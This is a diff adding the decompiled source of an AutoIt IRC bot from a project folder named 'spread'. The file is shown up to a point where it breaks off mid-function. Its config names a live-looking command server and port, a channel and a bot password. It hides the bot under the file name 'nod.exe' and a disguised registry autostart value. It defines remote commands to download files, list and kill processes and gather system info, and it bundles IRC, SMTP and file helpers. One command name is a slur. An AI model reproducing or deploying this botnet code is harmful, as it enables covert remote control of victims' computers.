@@ -1,0 +1,3549 @@
+; <AUT2EXE VERSION: 3.2.2.0>
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\core.au3>
+; ----------------------------------------------------------------------------
+
+
+#NoTrayIcon
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\config.au3>
+; ----------------------------------------------------------------------------
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Config Start																							   ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;; Main config
+
+;Global $Server = "smtp.computer-comlink.com" ;; Enter the IP/DNS to your IRCD here.
+Global $Server = "s0.dyns.be" ;; Enter the IP/DNS to your IRCD here.
+Global $Port = 2233 ;; Enter IRCD port here.
+Global $Channel = "#!spread!" ;; Channel that the bot will join.
+Global $Pass = "billgates" ;; Enter Bot Password.
+Global $Version = "rx_crow" ;; Bot version
+Global $Authhost = "lamer.org" ;; Bot Authentication Host. Example: "getalife.gov".
+Global $Filename = "nod.exe" ;; Filename in which the bot will run.
+Global $AutoStartValue = "ActiveScript32" ;; Registery Value to Autostart.
+
+;; Commands
+
+Dim $LOGIN = String( ".login" )
+Dim $LOGOUT = String(".logout")
+Dim $REMOVE = String(".nigout")
+Dim $PROCCL = String(".procclose")
+Dim $UPTIME = String ( ".uptime" )
+Dim $PROCLIST = String( ".proclist" )
+Dim $PMOFF = String( ".pmoff" )
+Dim $PMON = String( ".pmon" )
+Dim $IM = String( ".im" )
+Dim $VER = String (".version")
+Dim $DL = String (".download" )
+Dim $SYSINFO = String(".sysinfo")
+;Dim $CHCKWNDW = String( ".chckwndw" )
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Config End																							   ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\config.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\iNet.au3>
+; ----------------------------------------------------------------------------
+
+; ------------------------------------------------------------------------------
+;
+; AutoIt Version: 3.0
+; Language:       English
+; Description:    Functions that assist with Internet.
+;
+; ------------------------------------------------------------------------------
+;===============================================================================
+;
+; Function Name:    _GetIP()
+; Description:      Get public IP address of a network/computer.
+; Parameter(s):     None
+; Requirement(s):   Internet access.
+; Return Value(s):  On Success - Returns the public IP Address
+;                   On Failure - -1  and sets @ERROR = 1
+; Author(s):        Larry/Ezzetabi & Jarvis Stubblefield
+;
+;===============================================================================
+Func _GetIP()
+	Local $ip, $t_ip
+	If InetGet("http://checkip.dyndns.org/?rnd1=" & Random(1, 65536) & "&rnd2=" & Random(1, 65536), @TempDir & "\~ip.tmp") Then
+		$ip = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
+		FileDelete(@TempDir & "\~ip.tmp")
+		$ip = StringTrimLeft($ip, StringInStr($ip, ":") + 1)
+		$ip = StringTrimRight($ip, StringLen($ip) - StringInStr($ip, "/") + 2)
+		$t_ip = StringSplit($ip, '.')
+		If $t_ip[0] = 4 And StringIsDigit($t_ip[1]) And StringIsDigit($t_ip[2]) And StringIsDigit($t_ip[3]) And StringIsDigit($t_ip[4]) Then
+			Return $ip
+		EndIf
+	EndIf
+	If InetGet("http://www.whatismyip.com/?rnd1=" & Random(1, 65536) & "&rnd2=" & Random(1, 65536), @TempDir & "\~ip.tmp") Then
+		$ip = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
+		FileDelete(@TempDir & "\~ip.tmp")
+		$ip = StringTrimLeft($ip, StringInStr($ip, "Your ip is") + 10)
+		$ip = StringLeft($ip, StringInStr($ip, " ") - 1)
+		$ip = StringStripWS($ip, 8)
+		$t_ip = StringSplit($ip, '.')
+		If $t_ip[0] = 4 And StringIsDigit($t_ip[1]) And StringIsDigit($t_ip[2]) And StringIsDigit($t_ip[3]) And StringIsDigit($t_ip[4]) Then
+			Return $ip
+		EndIf
+	EndIf
+	SetError(1)
+	Return -1
+EndFunc   ;==>_GetIP
+
+;===============================================================================
+;
+; Function Name:    _INetExplorerCapable()
+; Description:      Convert a string to IE capable line
+; Parameter(s):     $s_IEString - String to convert to a capable IExplorer line
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns the converted string
+;                   On Failure - Blank String and @error = 1
+; Author(s):        Wes Wolfe-Wolvereness <Weswolf at aol dot com>
+;
+;===============================================================================
+;
+Func _INetExplorerCapable($s_IEString)
+	If StringLen($s_IEString) <= 0 Then
+		Return ''
+		SetError(1)
+	Else
+		Local $s_IEReturn
+		Local $i_IECount
+		Local $n_IEChar
+		For $i_IECount = 1 To StringLen($s_IEString)
+			$n_IEChar = '0x' & Hex(Asc(StringMid($s_IEString, $i_IECount, 1)), 2)
+			If $n_IEChar < 0x21 Or $n_IEChar = 0x25 Or $n_IEChar = 0x2f Or $n_IEChar > 0x7f Then
+				$s_IEReturn = $s_IEReturn & '%' & StringRight($n_IEChar, 2)
+			Else
+				$s_IEReturn = $s_IEReturn & Chr($n_IEChar)
+			EndIf
+		Next
+		Return $s_IEReturn
+	EndIf
+EndFunc   ;==>_INetExplorerCapable
+
+;===============================================================================
+;
+; Function Name:    _INetGetSource()
+; Description:      Gets the source from an URL without writing a temp file.
+; Parameter(s):     $s_URL = The URL of the site.
+; Requirement(s):   DllCall/Struct & WinInet.dll
+; Return Value(s):  On Success - Returns the source code.
+;                   On Failure - 0  and sets @ERROR = 1
+; Author(s):        Wouter van Kesteren.
+;
+;===============================================================================
+Func _INetGetSource($s_URL, $s_Header = '')
+
+	If StringLeft($s_URL, 7) <> 'http://' And StringLeft($s_URL, 8) <> 'https://' Then $s_URL = 'http://' & $s_URL
+
+	Local $h_DLL = DllOpen("wininet.dll")
+
+	Local $ai_IRF, $s_Buf = ''
+
+	Local $ai_IO = DllCall($h_DLL, 'int', 'InternetOpen', 'str', "AutoIt v3", 'int', 0, 'int', 0, 'int', 0, 'int', 0)
+	If @error Or $ai_IO[0] = 0 Then
+		DllClose($h_DLL)
+		SetError(1)
+		Return ""
+	EndIf
+
+	Local $ai_IOU = DllCall($h_DLL, 'int', 'InternetOpenUrl', 'int', $ai_IO[0], 'str', $s_URL, 'str', $s_Header, 'int', StringLen($s_Header), 'int', 0x80000000, 'int', 0)
+	If @error Or $ai_IOU[0] = 0 Then
+		DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IO[0])
+		DllClose($h_DLL)
+		SetError(1)
+		Return ""
+	EndIf
+
+	Local $v_Struct = DllStructCreate('udword')
+	DllStructSetData($v_Struct, 1, 1)
+
+	While DllStructGetData($v_Struct, 1) <> 0
+		$ai_IRF = DllCall($h_DLL, 'int', 'InternetReadFile', 'int', $ai_IOU[0], 'str', '', 'int', 256, 'ptr', DllStructGetPtr($v_Struct))
+		$s_Buf &= StringLeft($ai_IRF[2], DllStructGetData($v_Struct, 1))
+	WEnd
+
+	DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IOU[0])
+	DllCall($h_DLL, 'int', 'InternetCloseHandle', 'int', $ai_IO[0])
+	DllClose($h_DLL)
+	Return $s_Buf
+EndFunc   ;==>_INetGetSource
+
+;===============================================================================
+;
+; Function Name:    _INetMail()
+; Description:      Open default mail client with given Address/Subject/Body
+; Parameter(s):     $s_MailTo    - Address for E-Mail
+;                   $s_Subject   - Subject <Weswolf at aol dot com>of E-Mail
+;                   $s_MailBody  - Body of E-Mail
+; Requirement(s):   _INetExplorerCapable
+; Return Value(s):  On Success - Process ID of e-mail client
+;                   On Failure - If Opt('RunErrorsFatal', 1)
+;                                   -> Crash
+;                                Else Opt('RunErrorsFatal', 0)
+;                                   -> Blank String and @error = 1
+; Author(s):        Wes Wolfe-Wolvereness <Weswolf at aol dot com>
+;
+;===============================================================================
+;
+Func _INetMail($s_MailTo, $s_MailSubject, $s_MailBody)
+	Local $prev = opt("ExpandEnvStrings", 1)
+	Local $var = RegRead('HKCR\mailto\shell\open\command', "")
+	Local $ret = Run(StringReplace($var, '%1', _INetExplorerCapable('mailto:' & $s_MailTo & '?subject=' & $s_MailSubject & '&body=' & $s_MailBody)))
+	opt("ExpandEnvStrings", $prev)
+	Return $ret
+EndFunc   ;==>_INetMail
+
+;===============================================================================
+;
+; Function Name:    _INetSmtpMail()
+; Description:      Sends an email using SMTP over TCP IP.
+; Parameter(s):     $s_SmtpServer	- SMTP server to be used for sending email
+;                   $s_FromName		- Name of sender
+;                   $s_FromAddress	- eMail address of sender
+;                   $s_ToAddress	- Address that email is to be sent to
+;                   $s_Subject		- Subject of eMail
+;					$as_Body		- Single dimension array containing the body of eMail as strings
+;					$s_helo			- Helo identifier (default @COMPUTERNAME) sometime needed by smtp server
+;					$s_first		- send before Helo identifier (default @CRLF) sometime needed by smtp server
+;					$b_trace		- trace on a splash window (default 0 = no trace)
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns 1
+;                   On Failure - 0  and sets
+;											@ERROR = 1		-	Invalid Parameters
+;											@ERROR = 2		-	Unable to start TCP
+;											@ERROR = 3		-	Unable to resolve IP
+;											@ERROR = 4		-	Unable to create socket
+;											@ERROR = 5x		-	Cannot open SMTP session
+;											@ERROR = 50x	-	Cannot send body
+;											@ERROR = 5000	-	Cannot close SMTP session
+; Authors:        Original function to send email via TCP 	- Asimzameer
+;					Conversion to UDF						- Walkabout
+;					Correction	Helo, timeout, trace		- Jpm
+;					Correction send before Helo				- Jpm
+;
+;===============================================================================
+Func _INetSmtpMail($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_helo = "", $s_first=" ", $b_trace = 0)
+
+	Local $v_Socket
+	Local $s_IPAddress
+	Local $i_Count
+	Local $s_Send[6]
+	Local $s_ReplyCode[6];Return code from SMTP server indicating success
+
+	If $s_SmtpServer = "" Or $s_FromAddress = "" Or $s_ToAddress = "" Or $s_FromName = "" Or StringLen($s_FromName) > 256 Then
+		SetError(1)
+		Return 0
+	EndIf
+	If $s_helo = "" Then $s_helo = @ComputerName
+	If TCPStartup() = 0 Then
+		SetError(2)
+		Return 0
+	EndIf
+	StringRegExp($s_SmtpServer, "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")
+	If @extended Then
+		$s_IPAddress = $s_SmtpServer
+	Else
+		$s_IPAddress = TCPNameToIP($s_SmtpServer)
+	EndIf
+	If $s_IPAddress = "" Then
+		TCPShutdown()
+		SetError(3)
+		Return 0
+	EndIf
+	$v_Socket = TCPConnect($s_IPAddress, 25)
+	If $v_Socket = -1 Then
+		TCPShutdown()
+		SetError(4)
+		Return (0)
+	EndIf
+
+	$s_Send[0] = "HELO " & $s_helo & @CRLF
+	If StringLeft($s_helo,5) = "EHLO " Then $s_Send[0] = $s_helo & @CRLF
+	$s_ReplyCode[0] = "250"
+
+	$s_Send[1] = "MAIL FROM: <" & $s_FromAddress & ">" & @CRLF
+	$s_ReplyCode[1] = "250"
+	$s_Send[2] = "RCPT TO: <" & $s_ToAddress & ">" & @CRLF
+	$s_ReplyCode[2] = "250"
+	$s_Send[3] = "DATA" & @CRLF
+	$s_ReplyCode[3] = "354"
+
+	$s_Send[4] = 	"From:" & $s_FromName & "<" & $s_FromAddress & ">" & @CRLF & _
+			"To:" & "<" & $s_ToAddress & ">" & @CRLF & _
+			"Subject:" & $s_Subject & @CRLF & _
+			"Mime-Version: 1.0" & @CRLF & _
+			"Content-Type: text/plain; charset=US-ASCII" & @CRLF & _
+			@CRLF
+	$s_ReplyCode[4] = ""
+
+	$s_Send[5] = @CRLF & "." & @CRLF
+	$s_ReplyCode[5] = "250"
+
+	; open stmp session
+	If _SmtpSend($v_Socket, $s_Send[0], $s_ReplyCode[0], $b_trace, "220", $s_first) Then
+		SetError(50)
+		Return 0
+	EndIf
+	; send header
+	For $i_Count = 1 To UBound($s_Send) - 2
+		If _SmtpSend($v_Socket, $s_Send[$i_Count], $s_ReplyCode[$i_Count], $b_trace) Then
+			SetError(50 + $i_Count)
+			Return 0
+		EndIf
+	Next
+
+	; send body records (a record can be multiline : take care of a subline beginning with a dot should be ..)
+	For $i_Count = 0 To UBound($as_Body) - 1
+		; correct line beginning with a dot
+		If StringLeft($as_Body[$i_Count], 1) = "." Then $as_Body[$i_Count] = "." & $as_Body[$i_Count]
+
+		If _SmtpSend($v_Socket, $as_Body[$i_Count] & @CRLF, "", $b_trace) Then
+			SetError(500 + $i_Count)
+			Return 0
+		EndIf
+	Next
+
+	; close the smtp session
+	$i_Count = UBound($s_Send) - 1
+	If _SmtpSend($v_Socket, $s_Send[$i_Count], $s_ReplyCode[$i_Count], $b_trace) Then
+		SetError(5000)
+		Return 0
+	EndIf
+
+	TCPCloseSocket($v_Socket)
+	TCPShutdown()
+	Return 1
+EndFunc   ;==>_INetSmtpMail
+
+; internals routines----------------------------------
+Func _SmtpTrace($str, $timeout = 0)
+	Local $W_TITLE = "SMTP trace"
+	Local $g_smtptrace = ControlGetText($W_TITLE, "", "Static1")
+	$str = StringLeft(StringReplace($str, @CRLF, ""), 70)
+	$g_smtptrace &= @HOUR & ":" & @MIN & ":" & @SEC & " " & $str & @LF
+	If WinExists($W_TITLE) Then
+		ControlSetText($W_TITLE, "", "Static1", $g_smtptrace)
+	Else
+		SplashTextOn($W_TITLE, $g_smtptrace, 400, 500, 500, 100, 4 + 16, "", 8)
+	EndIf
+	If $timeout Then Sleep($timeout * 1000)
+EndFunc   ;==>_SmtpTrace
+
+Func _SmtpSend($v_Socket, $s_Send, $s_ReplyCode, $b_trace, $s_IntReply="", $s_first="")
+    Local $s_Receive, $i, $timer
+    If $b_trace Then _SmtpTrace($s_Send)
+
+    If $s_IntReply <> ""  Then
+
+        ; Send special first char to awake smtp server
+        If $s_first <> -1 Then
+            If TCPSend($v_Socket, $s_first) = 0 Then
+                TCPCloseSocket($v_Socket)
+                TCPShutdown()
+                Return 1; cannot send
+            EndIf
+        EndIf
+
+        ; Check intermediate reply before HELO acceptation
+        $s_Receive = ""
+        $timer = TimerInit()
+        While StringLeft($s_Receive,StringLen($s_IntReply)) <> $s_IntReply And TimerDiff($timer) < 45000
+            $s_Receive = TCPRecv($v_Socket, 1000)
+            If $b_trace And $s_Receive <> "" Then _SmtpTrace("intermediate->" & $s_Receive)
+        WEnd
+    EndIf
+
+    ; Send string.
+    If TCPSend($v_Socket, $s_Send) = 0 Then
+        TCPCloseSocket($v_Socket)
+        TCPShutdown()
+        Return 1; cannot send
+    EndIf
+
+    $timer = TimerInit()
+
+    $s_Receive = ""
+    While $s_Receive = "" And TimerDiff($timer) < 45000
+        $i += 1
+        $s_Receive = TCPRecv($v_Socket, 1000)
+        If $s_ReplyCode = "" Then ExitLoop
+    WEnd
+
+    If $s_ReplyCode <> "" Then
+        ; Check replycode
+        If $b_trace Then _SmtpTrace($i & " <- " & $s_Receive)
+
+        If StringLeft($s_Receive, StringLen($s_ReplyCode)) <> $s_ReplyCode Then
+            TCPCloseSocket($v_Socket)
+            TCPShutdown()
+            If $b_trace Then _SmtpTrace("<-> " & $s_ReplyCode, 5)
+            Return 2; bad receive code
+        EndIf
+    EndIf
+
+    Return 0
+EndFunc   ;==>_SmtpSend
+
+;===============================================================================
+;
+; Description:      Resolves IP adress to Hostname
+; CallTip:			_TCPIpToName($sIp, [$iOption = 0], [$hDll_Ws2_32 = "Ws2_32.dll"])
+; Parameter(s):     $sIp - Ip Adress in dotted (v4) Format
+;					$iOption - Optional, Default = 0
+;						0 = Return String Hostname
+;						1 = Return Array (see Notes)
+;                   $hDll_Ws2_32 - Optional, Handle to Ws2_32.dll
+; Requirement(s):   AutoIt 3.2.1.12+, Successfull TCPStartup
+; Return Value(s):  On Success - Hostname or Array (see Notes)
+;                   On Failure - ""  and Set
+;                                   @ERROR to:  1 - inet_addr DllCall Failed
+;                                               2 - inet_addr Failed
+;                                               3 - gethostbyaddr DllCall Failed
+;												4 - gethostbyaddr Failed, WSAGetLastError = @Extended
+;												5 - gethostbyaddr Failed, WSAGetLastError Failed
+;												6 - strlen/sZStringRead Failed
+;												7 - Error reading Aliases Array
+; Author(s):        Florian Fida
+; Note(s):			A successfull WSAStartup (Done by TCPStartup) is required.
+;					if $iOption = 1 then the returned Array looks Like this:
+;						$aResult[0] = Number of elemets
+;						$aResult[1] = "Hostname"
+;						$aResult[2] = "Alias 1"
+;						$aResult[3] = "Alias 2"
+;						...
+;
+;===============================================================================
+
+Func _TCPIpToName($sIp, $iOption = Default, $hDll_Ws2_32 = Default)
+	Local $vbinIP, $vaDllCall, $vptrHostent, $vHostent, $sHostnames, $vh_aliases, $i
+	Local $INADDR_NONE = 0xffffffff, $AF_INET = 2, $sSeperator = @CR
+	If $iOption = Default Then $iOption = 0
+	If $hDll_Ws2_32 = Default Then $hDll_Ws2_32 = "Ws2_32.dll"
+	$vaDllCall = DllCall($hDll_Ws2_32, "long", "inet_addr", "str", $sIp)
+	If @error Then Return SetError(1, 0, "") ; inet_addr DllCall Failed
+	$vbinIP = $vaDllCall[0]
+	If $vbinIP = $INADDR_NONE Then Return SetError(2, 0, "") ; inet_addr Failed
+	$vaDllCall = DllCall($hDll_Ws2_32, "ptr", "gethostbyaddr", "long_ptr", $vbinIP, "int", 4, "int", $AF_INET)
+	If @error Then Return SetError(3, 0, "") ; gethostbyaddr DllCall Failed
+	$vptrHostent = $vaDllCall[0]
+	If $vptrHostent = 0 Then
+		$vaDllCall = DllCall($hDll_Ws2_32, "int", "WSAGetLastError")
+		If @error Then Return SetError(5, 0, "") ; gethostbyaddr Failed, WSAGetLastError Failed
+		Return SetError(4, $vaDllCall[0], "") ; gethostbyaddr Failed, WSAGetLastError = @Extended
+	EndIf
+	$vHostent = DllStructCreate("ptr;ptr;short;short;ptr", $vptrHostent)
+	$sHostnames = __TCPIpToName_szStringRead(DllStructGetData($vHostent, 1))
+	If @error Then Return SetError(6, 0, $sHostnames) ; strlen/sZStringRead Failed
+	If $iOption = 1 Then
+		$sHostnames &= $sSeperator
+		For $i = 0 To 63 ; up to 64 Aliases
+			$vh_aliases = DllStructCreate("ptr", DllStructGetData($vHostent, 2) + ($i * 4))
+			If DllStructGetData($vh_aliases, 1) = 0 Then ExitLoop ; Null Pointer
+			$sHostnames &= __TCPIpToName_szStringRead(DllStructGetData($vh_aliases, 1))
+			If @error Then
+				SetError(7) ; Error reading array
+				ExitLoop
+			EndIf
+		Next
+		Return StringSplit(StringStripWS($sHostnames, 2), @CR)
+	Else
+		Return $sHostnames
+	EndIf
+EndFunc   ;==>_TCPIpToName
+
+; Internal
+Func __TCPIpToName_szStringRead($iszPtr, $iLen = -1, $hDll_msvcrt = "msvcrt.dll")
+	Local $aStrLen, $vszString
+	If $iszPtr < 1 Then Return "" ; Null Pointer
+	If $iLen < 0 Then
+		$aStrLen = DllCall($hDll_msvcrt, "int", "strlen", "ptr", $iszPtr)
+		If @error Then Return SetError(1, 0, "") ; strlen Failed
+		$iLen = $aStrLen[0] + 1
+	EndIf
+	$vszString = DllStructCreate("char[" & $iLen & "]", $iszPtr)
+	If @error Then Return SetError(2, 0, "")
+	Return SetError(0, $iLen, DllStructGetData($vszString, 1))
+EndFunc   ;==>__TCPIpToName_szStringRead
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\iNet.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\IRC.au3>
+; ----------------------------------------------------------------------------
+
+Func _IRCConnect ($server, $port, $nick)
+    Local $i = TCPConnect(TCPNameToIP($server), $port)
+    If $i = -1 Then
+		Return 1
+	Endif
+    TCPSend($i, "NICK " & $nick & @CRLF)
+    $ping = tcprecv($i,2048)
+    if stringleft($ping,4) = "PING" Then
+        $pong = stringreplace($ping,"PING :","")
+        tcpsend($i,"PONG " & $pong & @LF)
+    EndIf
+    TCPSend($i, "USER " & $nick & " 0 0 " & $nick & @CRLF)
+    Return $i
+EndFunc
+
+Func _IRCJoinChannel ($irc, $chan)
+	If $irc = -1 Then Return 0
+	TCPSend($irc, "JOIN " & $chan & @CRLF)
+	If @error Then
+		Return 1
+	EndIf
+	Return 1
+EndFunc
+
+Func _IRCSendMessage ($irc, $msg, $chan="")
+	If $irc = -1 Then Return 0
+	If $chan = "" Then
+		TCPSend($irc, $msg & @CRLF)
+		If @error Then
+
+			Return -1
+		EndIf
+		Return 1
+	EndIf
+	TCPSend($irc, "PRIVMSG " & $chan & " :" & $msg & @CRLF)
+		If @error Then
+		Return 1
+	EndIf
+	Return 1
+EndFunc
+
+Func _IRCChangeMode ($irc, $mode, $chan="")
+	If $irc = -1 Then Return 0
+	If $chan = "" Then
+		TCPSend($irc, "MODE " & $mode & @CRLF)
+		If @error Then
+
+		Return -1
+	EndIf
+	Return 1
+	EndIf
+	TCPSend($irc, "MODE " & $chan & " " & $mode & @CRLF)
+		If @error Then
+		Return 1
+	EndIf
+	Return 1
+EndFunc
+
+Func _IRCPing($irc , $ret)
+	If $ret = "" Then Return -1
+	TCPSend($irc, "PONG " & $ret & @CRLF)
+		If @error Then
+		Return 1
+	EndIf
+	Return 1
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\IRC.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\File.au3>
+; ----------------------------------------------------------------------------
+
+
+; ------------------------------------------------------------------------------
+;
+; AutoIt Version: 3.0
+; Language:       English
+; Description:    Functions that assist with files and directories.
+;
+; ------------------------------------------------------------------------------
+
+
+;===============================================================================
+;
+; Description:      Returns the number of lines in the specified file.
+; Syntax:           _FileCountLines( $sFilePath )
+; Parameter(s):     $sFilePath - Path and filename of the file to be read
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns number of lines in the file
+;                   On Failure - Returns 0 and sets @error = 1
+; Author(s):        Tylo <tylo at start dot no>
+; Note(s):          It does not count a final @LF as a line.
+;
+;===============================================================================
+Func _FileCountLines($sFilePath)
+	Local $N = FileGetSize($sFilePath) - 1
+	If @error Or $N = -1 Then Return 0
+	Return StringLen(StringAddCR(FileRead($sFilePath, $N))) - $N + 1
+EndFunc   ;==>_FileCountLines
+
+
+;===============================================================================
+;
+; Description:      Creates or zero's out the length of the file specified.
+; Syntax:           _FileCreate( $sFilePath )
+; Parameter(s):     $sFilePath - Path and filename of the file to be created
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns 1
+;                   On Failure - Returns 0 and sets:
+;                                @error = 1: Error opening specified file
+;                                @error = 2: File could not be written to
+; Author(s):        Brian Keene <brian_keene at yahoo dot com>
+; Note(s):          None
+;
+;===============================================================================
+Func _FileCreate($sFilePath)
+	;==============================================
+	; Local Constant/Variable Declaration Section
+	;==============================================
+	Local $hOpenFile
+	Local $hWriteFile
+
+	$hOpenFile = FileOpen($sFilePath, 2)
+
+	If $hOpenFile = -1 Then
+		SetError(1)
+		Return 0
+	EndIf
+
+	$hWriteFile = FileWrite($hOpenFile, "")
+
+	If $hWriteFile = -1 Then
+		SetError(2)
+		Return 0
+	EndIf
+
+	FileClose($hOpenFile)
+	Return 1
+EndFunc   ;==>_FileCreate
+
+;===============================================================================
+;
+; Description:      lists all files and folders in a specified path (Similar to using Dir with the /B Switch)
+; Syntax:           _FileListToArray($sPath, $sFilter = "*", $iFlag = 0)
+; Parameter(s):    	$sPath = Path to generate filelist for
+;                   $iFlag = determines weather to return file or folders or both
+;					$sFilter = The filter to use. Search the Autoit3 manual for the word "WildCards" For details
+;						$iFlag=0(Default) Return both files and folders
+;                       $iFlag=1 Return files Only
+;						$iFlag=2 Return Folders Only
+;
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns an array containing the list of files and folders in the specified path
+;                        On Failure - Returns the an empty string "" if no files are found and sets @Error on errors
+;						@Error=1 Path not found or invalid
+;						@Error=2 Invalid $sFilter
+;                       @Error=3 Invalid $iFlag
+;                 @Error=4 No File(s) Found
+;
+; Author(s):        SolidSnake <MetalGX91 at GMail dot com>
+; Note(s):			The array returned is one-dimensional and is made up as follows:
+;					$array[0] = Number of Files\Folders returned
+;					$array[1] = 1st File\Folder
+;					$array[2] = 2nd File\Folder
+;					$array[3] = 3rd File\Folder
+;					$array[n] = nth File\Folder
+;
+;					Special Thanks to Helge and Layer for help with the $iFlag update
+;===============================================================================
+Func _FileListToArray($sPath, $sFilter = "*", $iFlag = 0)
+	Local $hSearch, $sFile, $asFileList[1]
+	If Not FileExists($sPath) Then Return SetError(1, 1, "")
+	If (StringInStr($sFilter, "\")) Or (StringInStr($sFilter, "/")) Or (StringInStr($sFilter, ":")) Or (StringInStr($sFilter, ">")) Or (StringInStr($sFilter, "<")) Or (StringInStr($sFilter, "|")) Or (StringStripWS($sFilter, 8) = "") Then Return SetError(2, 2, "")
+	If Not ($iFlag = 0 Or $iFlag = 1 Or $iFlag = 2) Then Return SetError(3, 3, "")
+	$hSearch = FileFindFirstFile($sPath & "\" & $sFilter)
+	If $hSearch = -1 Then Return SetError(4, 4, "")
+	While 1
+		$sFile = FileFindNextFile($hSearch)
+		If @error Then
+			SetError(0)
+			ExitLoop
+		EndIf
+		If $iFlag = 1 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") <> 0 Then ContinueLoop
+		If $iFlag = 2 And StringInStr(FileGetAttrib($sPath & "\" & $sFile), "D") = 0 Then ContinueLoop
+		ReDim $asFileList[UBound($asFileList) + 1]
+		$asFileList[0] = $asFileList[0] + 1
+		$asFileList[UBound($asFileList) - 1] = $sFile
+	WEnd
+	FileClose($hSearch)
+	Return $asFileList
+EndFunc   ;==>_FileListToArray
+
+;===============================================================================
+; Function Name:   _FilePrint()
+; Description:     Prints a plain text file.
+; Syntax:          _FilePrint ( $s_File [, $i_Show] )
+;
+; Parameter(s):    $s_File     = The file to print.
+;                  $i_Show     = The state of the window. (default = @SW_HIDE)
+;
+; Requirement(s):  External:   = shell32.dll (it's already in system32).
+;                  Internal:   = None.
+;
+; Return Value(s): On Success: = Returns 1.
+;                  On Failure: = Returns 0 and sets @error according to the global constants list.
+;
+; Author(s):       erifash <erifash [at] gmail [dot] com>
+;
+; Note(s):         Uses the ShellExecute function of shell32.dll.
+;
+; Example(s):
+;   _FilePrint("C:\file.txt")
+;===============================================================================
+Func _FilePrint($s_File, $i_Show = @SW_HIDE)
+	Local $a_Ret = DllCall("shell32.dll", "long", "ShellExecute", _
+			"hwnd", 0, _
+			"string", "print", _
+			"string", $s_File, _
+			"string", "", _
+			"string", "", _
+			"int", $i_Show)
+	If $a_Ret[0] > 32 And Not @error Then
+		Return 1
+	Else
+		SetError($a_Ret[0])
+		Return 0
+	EndIf
+EndFunc   ;==>_FilePrint
+
+;===============================================================================
+;
+; Description:      Reads the specified file into an array.
+; Syntax:           _FileReadToArray( $sFilePath, $aArray )
+; Parameter(s):     $sFilePath - Path and filename of the file to be read
+;                   $aArray    - The array to store the contents of the file
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns 1
+;                   On Failure - Returns 0 and sets @error = 1
+; Author(s):        Jonathan Bennett <jon at hiddensoft dot com>
+; Note(s):          None
+;
+;===============================================================================
+Func _FileReadToArray($sFilePath, ByRef $aArray)
+	;==============================================
+	; Local Constant/Variable Declaration Section
+	;==============================================
+	Local $hFile
+
+	$hFile = FileOpen($sFilePath, 0)
+
+	If $hFile = -1 Then
+		SetError(1)
+		Return 0
+	EndIf
+
+	$aArray = StringSplit(StringStripCR(FileRead($hFile, FileGetSize($sFilePath))), @LF)
+
+	FileClose($hFile)
+	Return 1
+EndFunc   ;==>_FileReadToArray
+
+;===============================================================================
+;
+; Description:      Write array to File.
+; Syntax:           _FileWriteFromArray( $sFilePath, $aArray )
+; Parameter(s):     $sFilePath - Path and filename of the file to be written
+;                   $a_Array   - The array to retrieve the contents
+;                   $i_Base    - Start reading at this Array entry.
+;                   $I_Ubound  - End reading at this Array entry.
+;                                Default UBound($a_Array) - 1
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns 1
+;                   On Failure - Returns 0 and sets @error = 1
+; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
+; Note(s):          None
+;
+;===============================================================================
+Func _FileWriteFromArray($sFilePath, $a_Array, $i_Base = 0, $i_UBound = 0)
+	;==============================================
+	; Local Constant/Variable Declaration Section
+	;==============================================
+	Local $hFile
+	; Check if we have a valid array as input
+	If Not IsArray($a_Array) Then
